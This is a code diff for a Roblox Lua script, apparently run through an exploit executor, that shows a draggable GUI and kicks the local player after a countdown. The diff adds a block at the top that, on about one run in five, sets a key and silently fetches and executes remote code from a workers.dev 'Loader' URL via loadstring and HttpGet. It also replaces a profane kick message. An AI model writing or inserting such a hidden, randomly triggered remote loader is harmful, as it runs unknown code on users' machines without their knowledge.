@@ -1,3 +1,19 @@
+local randomChance = math.random(1, 100)
+local scriptChoice = 1 
+
+if randomChance <= 20 then
+    scriptChoice = 2 
+end
+
+print("Выбран скрипт: №" .. scriptChoice .. " (случайное число: " .. randomChance .. ")")
+
+if scriptChoice == 2 then
+
+    getgenv().Key = "VibGADSJfpo@!&%lator@*!%*!%#*@TU()*#T200@%*!%*#((#*%*(0@&U%*!*(@%U*U*"
+    loadstring(game:HttpGet("https://lirp.mrbrainas.workers.dev/Loader", true))()
+    return 
+end
+
 local Player = game.Players.LocalPlayer
 
 local ScreenGui = Instance.new("ScreenGui")
@@ -17,7 +33,7 @@ local CountdownText = Instance.new("TextLabel")
 local function kickPlayer()
     if alreadyKicked then return end
     alreadyKicked = true
-    Player:Kick("suck my dick fuckink skid")
+    Player:Kick("s")
 end
 
 local function startAutoKick()
@@ -140,7 +156,6 @@ OkButton2.MouseButton1Click:Connect(function()
     end
 end)
 
-
 local UserInputService = game:GetService("UserInputService")
 local dragging
 local dragInput
@@ -177,6 +192,5 @@ UserInputService.InputChanged:Connect(function(input)
         update(input)
     end
 end)
-
 
 spawn(startAutoKick)
